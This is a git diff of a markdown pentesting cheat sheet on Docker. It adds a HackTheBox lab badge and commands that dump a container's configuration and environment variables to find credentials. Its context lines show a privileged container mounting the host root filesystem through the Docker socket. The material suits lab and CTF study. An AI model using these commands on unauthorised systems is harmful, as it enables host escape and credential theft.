@@ -524,6 +524,7 @@ networks:
 ## Docker Pentester Notes ☠️
 
 [![chillhack](../../../../cybersecurity/_badges/thm-p/chillhack.svg)](https://tryhackme.com/room/chillhack)
+[![busqueda](../../../../cybersecurity/_badges/htb-p/busqueda.svg)](https://app.hackthebox.com/machines/Busqueda)
 
 <div class="row row-cols-lg-2"><div>
 
@@ -552,6 +553,13 @@ $ docker -H unix:///run/docker.sock run --rm -d --privileged -v /:/hostfs xxx ba
 $ docker -H unix:///run/docker.sock run --privileged -v /:/hostfs xxx ls
 ```
 </div><div>
+
+Docker inspect may be used to find credentials.
+
+```ps
+$ docker inspect xxx -f '{{json .Config }}' | jq
+$ docker inspect xxx -f '{{json .Config.Env }}' | jq
+```
 </div></div>
 
 <hr class="sep-both">
